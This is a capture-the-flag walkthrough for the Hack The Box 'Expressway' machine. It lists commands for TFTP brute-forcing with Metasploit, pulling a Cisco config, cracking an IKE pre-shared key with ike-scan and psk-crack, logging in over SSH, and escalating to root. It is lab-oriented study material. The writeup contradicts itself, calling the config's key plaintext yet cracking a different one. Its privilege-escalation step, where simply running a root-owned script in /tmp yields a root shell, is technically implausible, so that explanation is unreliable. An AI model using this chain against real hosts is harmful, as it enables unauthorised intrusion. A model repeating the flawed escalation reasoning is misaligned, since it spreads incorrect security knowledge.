# Hack The Box — Expressway

Difficulty: Easy
OS: Linux
IP: 10.10.11.87

## Summary

Expressway is a multi-stage machine combining network service enumeration, credential extraction, and local privilege escalation via unsafe temporary file execution. Initial access is obtained by exploiting an exposed TFTP service to retrieve a Cisco router configuration containing an IKE PSK, which is cracked and reused for SSH access. Privilege escalation is achieved by executing a root-owned script placed in /tmp.

Attack Path Overview
TFTP (69/udp)
  └─ Cisco router config leak
       └─ IKE PSK disclosure
            └─ SSH access as user ike
                 └─ Root process drops executable script in /tmp
                      └─ Execute script → root shell

## 1. Enumeration
Port Scan
nmap -Pn -p- --min-rate 3000 10.10.11.87


Open Ports:

22/tcp — SSH

69/udp — TFTP

500/udp — ISAKMP (IKE)

4500/udp — NAT-T (IKE)

## 2. TFTP Enumeration (Initial Access Vector)
Identify exposed files
msfconsole
use auxiliary/scanner/tftp/tftpbrute
set RHOSTS 10.10.11.87
run


Discovered file:

ciscortr.cfg

Download configuration
tftp 10.10.11.87
get ciscortr.cfg

## 3. Credential Discovery
Extract credentials from config

Relevant contents of ciscortr.cfg:

username ike password *****
crypto isakmp client configuration group rtr-remote
 key secret-password


The IKE pre-shared key is present in plaintext.

## 4. IKE PSK Cracking
Extract IKE hash
ike-scan -M 10.10.11.87 > hash.txt

Crack PSK
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt


Recovered PSK:

freakingrockstarontheroad

## 5. SSH Access
Login as user ike
ssh ike@10.10.11.87


Credentials:

User: ike

Password: freakingrockstarontheroad

User Flag
cat user.txt

## 6. Local Enumeration
User context
id

uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)

SUID binaries
find / -perm -4000 -type f 2>/dev/null


Notable:

/usr/sbin/exim4 (SUID root)

Exim expansion abuse was ruled out due to privilege dropping.

## 7. Privilege Escalation
Key Observation

A root-owned script was found in /tmp, a world-writable and executable directory.

ls -la /tmp


The script was:

Owned by root

Executable

Automatically created by a root process

Exploitation

Executing the script resulted in a root shell:

/tmp/exp.sh

Root Access
id

uid=0(root) gid=0(root)

Root Flag
cat /root/root.txt

Root Cause Analysis

Root processes wrote executable files to /tmp

No permission hardening or cleanup

User could execute root-owned scripts

This represents a classic unsafe temporary file execution vulnerability.

Key Lessons Learned

Always enumerate UDP services

TFTP commonly leaks sensitive network configs

Cisco router configs often contain plaintext secrets

/tmp, /var/tmp, /dev/shm should always be inspected

Root-owned files in writable directories are critical privesc targets

Tools Used

nmap

ike-scan

psk-crack

msfconsole

tftp

Standard Linux enumeration tools
